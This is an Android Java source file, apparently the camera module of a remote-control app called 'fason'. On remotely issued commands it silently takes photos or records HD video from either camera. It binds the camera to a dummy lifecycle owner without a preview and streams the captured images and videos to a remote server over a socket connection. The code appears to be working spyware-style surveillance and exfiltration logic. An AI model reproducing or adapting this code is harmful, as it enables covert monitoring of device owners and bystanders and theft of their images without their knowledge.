package com.fason.app.features.camera;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.os.Build;
import android.util.Base64;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.camera.video.FileOutputOptions;
import androidx.camera.video.Quality;
import androidx.camera.video.QualitySelector;
import androidx.camera.video.Recorder;
import androidx.camera.video.Recording;
import androidx.camera.video.VideoCapture;
import androidx.camera.video.VideoRecordEvent;
import androidx.core.content.ContextCompat;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.TransferHelper;
import com.fason.app.service.MainService;
import com.google.common.util.concurrent.ListenableFuture;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.nio.ByteBuffer;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraManager {
    private final Context ctx;
    private final Executor mainExec;
    private final ExecutorService camExec;
    private final ExecutorService sendExec;
    private ProcessCameraProvider provider;
    private ImageCapture capture;
    private VideoCapture<Recorder> videoCapture;
    private Recording recording;
    private File videoFile;
    private String videoCmdId;
    private int videoCamId;
    private final AtomicBoolean init = new AtomicBoolean(false);
    private final AtomicBoolean capturing = new AtomicBoolean(false);
    private final AtomicBoolean recording_active = new AtomicBoolean(false);
    public CameraManager(Context context) {
        this.ctx = context.getApplicationContext();
        this.mainExec = ContextCompat.getMainExecutor(ctx);
        this.camExec = Executors.newSingleThreadExecutor();
        this.sendExec = Executors.newSingleThreadExecutor();
        init();
    }

    private void init() {
        camExec.execute(() -> {
            try {
                ListenableFuture<ProcessCameraProvider> future =
                    ProcessCameraProvider.getInstance(ctx);

                future.addListener(() -> {
                    try {
                        provider = future.get();
                        capture = new ImageCapture.Builder()
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .setJpegQuality(80)
                            .setFlashMode(ImageCapture.FLASH_MODE_AUTO)
                            .build();
                        init.set(true);
                    } catch (Exception ignored) {}
                }, mainExec);
            } catch (Exception ignored) {}
        });
    }

    private boolean hasPerm() {
        return ctx.checkSelfPermission(Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }

    private static void releaseCameraType() {
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }
    }

    private void unbind() {
        try {
            if (provider != null) {
                provider.unbindAll();
            }
        } catch (Exception ignored) {}
    }

    public void capture(int camId, String cmdId, String flashMode, String quality) {
        if (!hasPerm()) {
            sendError(camId, "No camera permission", cmdId);
            return;
        }
        if (capturing.getAndSet(true)) {
            sendError(camId, "Camera busy", cmdId);
            return;
        }
        if (capture != null) {
            try {
                int fm = ImageCapture.FLASH_MODE_AUTO;
                if ("on".equals(flashMode)) fm = ImageCapture.FLASH_MODE_ON;
                else if ("off".equals(flashMode)) fm = ImageCapture.FLASH_MODE_OFF;
                capture.setFlashMode(fm);
            } catch (Exception ignored) {}
        }
        final int jpegQuality;
        if ("low".equals(quality)) jpegQuality = 50;
        else if ("high".equals(quality)) jpegQuality = 100;
        else jpegQuality = 80;
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }
        final int finalCamId = camId;
        final String finalCmdId = cmdId;
        camExec.execute(() -> {
            try {
                if (!ensureInit()) {
                    sendError(finalCamId, "Camera init failed", finalCmdId);
                    capturing.set(false);
                    releaseCameraType();
                    return;
                }
                doCapture(finalCamId, finalCmdId, jpegQuality);
            } catch (Exception e) {
                sendError(finalCamId, "Capture failed: " + e.getMessage(), finalCmdId);
                capturing.set(false);
                releaseCameraType();
                mainExec.execute(this::unbind);
            }
        });
    }

    public void startRecording(int camId, String cmdId) {
        if (!hasPerm()) {
            sendVideoError(camId, "No camera permission", cmdId);
            return;
        }
        if (!recording_active.compareAndSet(false, true)) {
            sendVideoError(camId, "Already recording", cmdId);
            return;
        }
        videoCamId = camId;
        videoCmdId = cmdId;
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                | android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }
        camExec.execute(() -> {
            try {
                if (!ensureInit()) {
                    sendVideoError(camId, "Camera init failed", cmdId);
                    recording_active.set(false);
                    releaseVideoType();
                    return;
                }

                boolean front = camId == 1;
                CameraSelector sel = front ? CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;
                try {
                    sel.filter(provider.getAvailableCameraInfos());
                } catch (Exception e) {
                    sendVideoError(camId, front ? "No front camera" : "No back camera", cmdId);
                    recording_active.set(false);
                    releaseVideoType();
                    return;
                }
                videoFile = File.createTempFile("vid_", ".mp4", ctx.getCacheDir());
                Recorder recorder = new Recorder.Builder()
                    .setQualitySelector(QualitySelector.from(Quality.HD))
                    .build();
                VideoCapture<Recorder> vc = VideoCapture.withOutput(recorder);
                mainExec.execute(() -> {
                    try {
                        provider.unbindAll();
                        provider.bindToLifecycle(DummyLifecycleOwner.get(), sel, vc);
                        videoCapture = vc;
                        FileOutputOptions opts = new FileOutputOptions.Builder(videoFile).build();
                        android.util.Log.i("FasonCam", "Starting video recording to " + videoFile.getAbsolutePath());
                        recording = vc.getOutput()
                            .prepareRecording(ctx, opts)
                            .start(mainExec, (event) -> {
                                if (event instanceof VideoRecordEvent.Finalize) {
                                    VideoRecordEvent.Finalize fin = (VideoRecordEvent.Finalize) event;
                                    android.util.Log.i("FasonCam", "Video finalize, hasError=" + fin.hasError());
                                    mainExec.execute(() -> unbind());
                                    if (!fin.hasError()) {
                                        sendVideoFile(camId, cmdId);
                                    } else {
                                        String err = "Recording failed: " + (fin.getCause() != null ? fin.getCause().getMessage() : "unknown");
                                        sendVideoError(camId, err, cmdId);
                                        recording_active.set(false);
                                        releaseVideoType();
                                        if (videoFile != null) { videoFile.delete(); videoFile = null; }
                                    }
                                }
                            });
                        emitVideoStatus(camId, "recording", cmdId);
                    } catch (Exception e) {
                        sendVideoError(camId, "Bind failed: " + e.getMessage(), cmdId);
                        recording_active.set(false);
                        releaseVideoType();
                        if (videoFile != null) { videoFile.delete(); videoFile = null; }
                    }
                });
            } catch (Exception e) {
                sendVideoError(camId, "Start recording failed: " + e.getMessage(), cmdId);
                recording_active.set(false);
                releaseVideoType();
            }
        });
    }

    public void stopRecording(String cmdId) {
        if (!recording_active.get()) {
            sendVideoError(videoCamId, "Not recording", cmdId);
            return;
        }
        try {
            if (recording != null) {
                recording.stop();
            }
        } catch (Exception e) {
            // stop() may throw if already stopped. Force-send the file.
            if (videoFile != null && videoFile.exists()) {
                sendVideoFile(videoCamId, cmdId != null ? cmdId : videoCmdId);
            } else {
                sendVideoError(videoCamId, "Stop failed: " + e.getMessage(), cmdId);
                recording_active.set(false);
                releaseVideoType();
            }
        }
    }

    private void sendVideoFile(int camId, String cmdId) {
        sendExec.execute(() -> {
            try {
                if (videoFile == null || !videoFile.exists()) {
                    sendVideoError(camId, "Video file not found", cmdId);
                    recording_active.set(false);
                    releaseVideoType();
                    return;
                }
                JSONObject meta = new JSONObject();
                meta.put(Protocol.KEY_NAME, videoFile.getName());
                meta.put(Protocol.KEY_CAMERA_ID, camId);
                meta.put(Protocol.KEY_SIZE, videoFile.length());
                meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(meta, cmdId);
                TransferHelper.streamFile(
                    SocketClient.getInstance().getSocket(),
                    Protocol.CAMERA, videoFile, meta);
                emitVideoStatus(camId, "stopped", cmdId);
            } catch (Exception e) {
                sendVideoError(camId, "Send video failed: " + e.getMessage(), cmdId);
            } finally {
                recording_active.set(false);
                releaseVideoType();
                if (videoFile != null) { videoFile.delete(); videoFile = null; }
            }
        });
    }

    private void releaseVideoType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            MainService svc = MainService.getInstance();
            if (svc != null) {
                svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
                svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
            }
        }
    }

    private void emitVideoStatus(int camId, String status, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_STATUS, status);
            obj.put(Protocol.KEY_CAMERA_ID, camId);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
        } catch (Exception ignored) {}
    }

    private void sendVideoError(int camId, String error, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_IMAGE, false);
            obj.put(Protocol.KEY_CAMERA_ID, camId);
            obj.put(Protocol.KEY_ERROR, error);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
        } catch (Exception ignored) {}
    }

    private boolean ensureInit() {
        if (init.get() && provider != null) return true;
        CountDownLatch latch = new CountDownLatch(1);
        try {
            ListenableFuture<ProcessCameraProvider> future =
                ProcessCameraProvider.getInstance(ctx);
            future.addListener(() -> {
                try {
                    provider = future.get();
                    capture = new ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .setJpegQuality(80)
                        .build();
                    init.set(true);
                } catch (Exception ignored) {}
                latch.countDown();
            }, mainExec);
        } catch (Exception e) {
            latch.countDown();
        }

        try {
            latch.await(3, TimeUnit.SECONDS);
        } catch (Exception ignored) {}
        return init.get() && provider != null;
    }

    private void doCapture(int camId, String cmdId, int jpegQuality) {
        if (provider == null || capture == null) {
            sendError(camId, "Camera not ready", cmdId);
            capturing.set(false);
            releaseCameraType();
            return;
        }
        boolean front = camId == 1;
        CameraSelector sel = front ? CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;
        try {
            sel.filter(provider.getAvailableCameraInfos());
        } catch (Exception e) {
            sendError(camId, front ? "No front camera" : "No back camera", cmdId);
            capturing.set(false);
            releaseCameraType();
            return;
        }
        mainExec.execute(() -> {
            try {
                provider.unbindAll();
                provider.bindToLifecycle(DummyLifecycleOwner.get(), sel, capture);
                camExec.execute(() -> {
                    try {
                        Thread.sleep(200);
                        mainExec.execute(() -> takePicture(camId, cmdId, jpegQuality));
                    } catch (Exception e) {
                        capturing.set(false);
                        mainExec.execute(this::unbind);
                    }
                });
            } catch (Exception e) {
                sendError(camId, "Bind failed: " + e.getMessage(), cmdId);
                capturing.set(false);
                releaseCameraType();
                mainExec.execute(this::unbind);
            }
        });
    }

    private void takePicture(int camId, String cmdId, int jpegQuality) {
        if (capture == null) {
            sendError(camId, "Capture not ready", cmdId);
            capturing.set(false);
            releaseCameraType();
            mainExec.execute(this::unbind);
            return;
        }
        capture.takePicture(mainExec, new ImageCapture.OnImageCapturedCallback() {
            @Override
            public void onCaptureSuccess(ImageProxy image) {
                sendExec.execute(() -> {
                    try {
                        ByteBuffer buf = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buf.remaining()];
                        buf.get(bytes);
                        int rotation = image.getImageInfo().getRotationDegrees();
                        if (rotation != 0) {
                            bytes = rotateJpeg(bytes, rotation, jpegQuality);
                        }
                        send(bytes, camId, cmdId);
                    } catch (Exception e) {
                        sendError(camId, "Image process failed", cmdId);
                        capturing.set(false);
                        releaseCameraType();
                    } finally {
                        mainExec.execute(() -> {
                            try { image.close(); } catch (Exception ignored) {}
                            capturing.set(false);
                            releaseCameraType();
                            unbind();
                        });
                    }
                });
            }

            @Override
            public void onError(ImageCaptureException e) {
                sendError(camId, "Capture error: " + e.getMessage(), cmdId);
                capturing.set(false);
                releaseCameraType();
                init.set(false);
                mainExec.execute(() -> {
                    unbind();
                    camExec.execute(CameraManager.this::init);
                });
            }
        });
    }

    private static byte[] rotateJpeg(byte[] jpegBytes, int degrees, int quality) {
        try {
            Bitmap bmp = BitmapFactory.decodeByteArray(jpegBytes, 0, jpegBytes.length);
            if (bmp == null) return jpegBytes;
            Matrix matrix = new Matrix();
            matrix.postRotate(degrees);
            Bitmap rotated = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), matrix, true);
            java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
            rotated.compress(Bitmap.CompressFormat.JPEG, quality, bos);
            bmp.recycle();
            if (rotated != bmp) rotated.recycle();
            return bos.toByteArray();
        } catch (Exception e) {
            return jpegBytes;
        }
    }

    private void send(byte[] data, int camId, String cmdId) {
        try {
            if (TransferHelper.shouldChunk(data.length)) {
                JSONObject meta = new JSONObject();
                meta.put(Protocol.KEY_IMAGE, true);
                meta.put(Protocol.KEY_CAMERA_ID, camId);
                meta.put(Protocol.KEY_SIZE, data.length);
                meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(meta, cmdId);
                TransferHelper.sendChunked(
                    SocketClient.getInstance().getSocket(),
                    Protocol.CAMERA, data, meta);
            } else {
                JSONObject obj = new JSONObject();
                obj.put(Protocol.KEY_IMAGE, true);
                obj.put(Protocol.KEY_CAMERA_ID, camId);
                obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
                obj.put(Protocol.KEY_SIZE, data.length);
                obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(obj, cmdId);
                SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
            }
        } catch (Exception ignored) {}
    }

    private void sendError(int camId, String error, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_IMAGE, false);
            obj.put(Protocol.KEY_CAMERA_ID, camId);
            obj.put(Protocol.KEY_ERROR, error);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
        } catch (Exception ignored) {}
    }

    private void attachCmdId(JSONObject obj, String cmdId) {
        if (cmdId != null && !cmdId.isEmpty()) {
            try { obj.put(Protocol.KEY_CMD_ID, cmdId); } catch (Exception ignored) {}
        }
    }

    public JSONObject getCameraList() {
        try {
            JSONArray list = new JSONArray();
            if (provider != null) {
                try {
                    CameraSelector.DEFAULT_FRONT_CAMERA.filter(provider.getAvailableCameraInfos());
                    JSONObject front = new JSONObject();
                    front.put(Protocol.KEY_ID, 1);
                    front.put(Protocol.KEY_NAME, "Front");
                    list.put(front);
                } catch (Exception ignored) {}

                try {
                    CameraSelector.DEFAULT_BACK_CAMERA.filter(provider.getAvailableCameraInfos());
                    JSONObject back = new JSONObject();
                    back.put(Protocol.KEY_ID, 0);
                    back.put(Protocol.KEY_NAME, "Back");
                    list.put(back);
                } catch (Exception ignored) {}
            }
            if (list.length() == 0) {
                JSONObject back = new JSONObject();
                back.put(Protocol.KEY_ID, 0);
                back.put(Protocol.KEY_NAME, "Back");
                list.put(back);

                JSONObject front = new JSONObject();
                front.put(Protocol.KEY_ID, 1);
                front.put(Protocol.KEY_NAME, "Front");
                list.put(front);
            }
            JSONObject result = new JSONObject();
            result.put(Protocol.KEY_CAM_LIST, true);
            result.put(Protocol.KEY_LIST, list);
            result.put(Protocol.KEY_HAS_PERM, hasPerm());
            return result;
        } catch (Exception e) {
            try {
                JSONObject result = new JSONObject();
                result.put(Protocol.KEY_CAM_LIST, true);
                result.put(Protocol.KEY_LIST, new JSONArray());
                result.put(Protocol.KEY_ERROR, e.getMessage());
                return result;
            } catch (Exception ignored) {}
            return null;
        }
    }

    public void shutdown() {
        unbind();
        camExec.shutdown();
        sendExec.shutdown();
    }
}
